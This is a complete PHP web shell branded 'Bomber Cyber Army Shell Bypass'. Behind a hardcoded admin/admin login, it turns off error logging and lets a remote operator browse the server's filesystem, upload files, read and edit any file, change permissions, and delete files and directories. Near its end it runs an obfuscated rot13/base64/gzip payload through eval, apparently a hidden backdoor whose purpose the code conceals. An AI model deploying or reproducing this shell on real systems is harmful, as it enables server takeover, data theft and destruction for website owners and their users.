<?php
// --- pop-up

$user = "admin";
$pass = "admin";

 if (($_SERVER["PHP_AUTH_USER"] != $user) || (($_SERVER["PHP_AUTH_PW"]) != $pass))

 {

  header("WWW-Authenticate: Basic realm=\" suck\"");

  header("HTTP/1.0 401 Unauthorized");

  exit();

 }

// --- php shell 
error_reporting(0); 
	@clearstatcache();
	@ini_set('error_log',NULL);
	@ini_set('log_errors',0);
	@ini_set('max_execution_time',0);
	@ini_set('output_buffering',0);
	@ini_set('display_errors', 0);
session_start();

echo '<!DOCTYPE HTML>
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
<center>
<style>
html {
	 background: url(https://i.imgur.com/ckv5gUa.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
<style type="text/css">
body {
	font-family: Kelly Slab;
	background: url("https://classiclook.id/bca.jpeg");
	color: lime;
	background-attachment: fixed;
    background-position: center;
	}
#content tr:hover{
	background-color: red;
	text-shadow:0px 0px 10px #000000;
	}
#content .first{
	color: #000000;
	background-image:url(#);
	}
#content .first:hover{
	background-color: red;
	text-shadow:0px 0px 1px #339900;
	}
table, th, td {
		border-collapse:collapse;
		padding: 5px;
		color: lime;
		}
.table_home, .th_home, .td_home { 
		color: lime;
		border: 2px solid red;
		padding: 7px;
		}
a{
	font-size: 19px;
	color: #00ff00;
	text-decoration: none;
	}
a:hover{
	color: white;
	text-shadow:0px 0px 10px #339900;
	}
input,select,textarea{
	border: 1px #ffffff solid;
	-moz-border-radius: 5px;
	-webkit-border-radius:5px;
	border-radius:5px;
	}
.close {
	overflow: auto;
	border: 1px solid lime;
	background: lime;
	color: white;
	}
.r {
	float: right;
	text-align: right;
	}
</style>

<a href="?"><h1 style="font-family: Kelly Slab; font-size: 35px; color: white;">
Bomber Cyber Army Shell Bypass </h1></a>
<body>

<table width="95%" border="0" cellpadding="0" cellspacing="0" align="left">
<tr><td>';
echo "<tr><td><font color='white'>
<i class='fa fa-user'></i> <td>: <font color='lime'>".$_SERVER['REMOTE_ADDR']."<tr><td><font color='white'>
<i class='fa fa-desktop'></i> <td>: <font color='lime'>".gethostbyname($_SERVER['HTTP_HOST'])." / ".$_SERVER['SERVER_NAME']."<tr><td><font color='white'>
<i class='fa fa-hdd-o'></i> <td>: <font color='lime'>".php_uname()."</font></tr></td></table>";

echo '<table width="95%" border="0" cellpadding="0" cellspacing="0" align="center">
<tr align="center"><td align="center"><br>';

if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<i class="fa fa-folder-o"></i> : <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}


//upload
echo '<br><br><br><font color="lime"><form enctype="multipart/form-data" method="POST">
Upload File: <input type="file" name="file" style="color:lime;border:2px solid lime;" required/></font>
<input type="submit" value="UPLOAD" style="margin-top:4px;width:100px;height:27px;font-family:Kelly Slab;font-size:15;background:black;color: lime;border:2px solid lime;border-radius:5px"/>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<br><br><font color="lime">UPLOAD SUCCES BRO</font><br/>';
}else{
echo '<script>alert("File Gagal Diupload Bro")</script>';
}
}

echo '</form></td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>files >> ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo(' <textarea  style="font-size: 8px; border: 1px solid white; background-color: black; color: white; width: 100%;height: 1200px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';

//Chmod
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<br><br><font color="lime">CHANGE PERMISSION SUCCESS BRO</font><br/>';
}else{
echo '<script>alert("Change Permission Gagal Bro")</script>';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" style="width:80px; height: 30px;"/>
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Lanjut" style="width:60px; height: 30px;"/>
</form>';
}

//rename folder
elseif($_GET['opt'] == 'btw'){
	$cwd = getcwd();
	 echo '<form action="?option&path='.$cwd.'&opt=delete&type=buat" method="POST">
New Name : <input name="name" type="text" size="25" value="Folder" style="width:300px; height: 30px;"/>
<input type="hidden" name="path" value="'.$cwd.'">
<input type="hidden" name="opt" value="delete">
<input type="submit" value="Go" style="width:100px; height: 30px;"/>
</form>';
}

//rename file
elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<br><br><font color="lime">CHANGE NAME SUCCESS BRO</font><br/>';
}else{
echo '<script>alert("Change Name Gagal Bro")</script>';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="5" style="width:20%; height:30px;" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Lanjut" style="height:30px;" />
</form>';
}

//edit file
elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<br><br><font color="lime">EDIT FILE SUCCESS BRO</font><br/>';
}else{
echo '<script>alert("Edit File Gagal Bro")</script>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src" style="font-size: 8px; border: 1px solid white; background-color: black; color: white; width: 100%;height: 1000px;">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Lanjut" style="height:30px; width:70px;"/>
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';

//delete dir
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<br><br><font color="lime">DELETE DIR SUCCESS BRO</font><br/>';
}else{
echo '<script>alert("Delete Dir Gagal Bro")</script>>';
}
}

//delete file
elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<br><br><font color="lime">DELETE FILE SUCCESS BRO</font><br/>';
}else{
echo '<script>alert("Delete File Gagal Bro")</script>';
}
}
}

?>
<?php
echo '</center>';
$scandir = scandir($path);
$pa = getcwd();
echo '<div id="content"><table width="95%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<th><center>Name</center></th>
<th><center>Size</center></th>
<th><center>Perm</center></th>
<th><center>Options</center></th>
</tr>
<tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td class=td_home><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='><a href=\"?path=$path/$dir\"> $dir</a></td>
<td class=td_home><center>DIR</center></td>
<td class=td_home><center>";
if(is_writable("$path/$dir")) echo '<font color="#57FF00">';
elseif(!is_readable("$path/$dir")) echo '<font color="#FF0004">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td class=td_home><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Kelly Slab;font-size:15;background:black;color:lime;border:2px solid lime;border-radius:5px\">
<option value=\"Action\">Action</option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" style=\"margin-top:6px;width:27;font-family:Kelly Slab;font-size:15;background:black;color:lime;border:2px solid lime;border-radius:5px\"/>
</form></center></td>
</tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td class=td_home><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href=\"?filesrc=$path/$file&path=$path\"> $file</a></td>
<td class=td_home><center>".$size."</center></td>
<td class=td_home><center>";
if(is_writable("$path/$file")) echo '<font color="#57FF00">';
elseif(!is_readable("$path/$file")) echo '<font color="#FF0004">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';

echo "</center></td>
<td class=td_home><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Kelly Slab;font-size:15;background:black;color:lime;border:2px solid lime;border-radius:5px\">
<option value=\"Action\">Action</option>
<option value=\"delete\">Delete</option>
<option value=\"edit\">Edit</option>
<option value=\"rename\">Rename</option>
<option value=\"chmod\">Chmod</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" style=\"margin-top:6px;width:27;font-family:Kelly Slab;font-size:15;background:black;color:lime;border:2px solid lime;border-radius:5px\"/>
</form></center></td>
</tr>";
}

echo '</table>
</div>'; eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
}

function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>

</BODY>
</HTML>
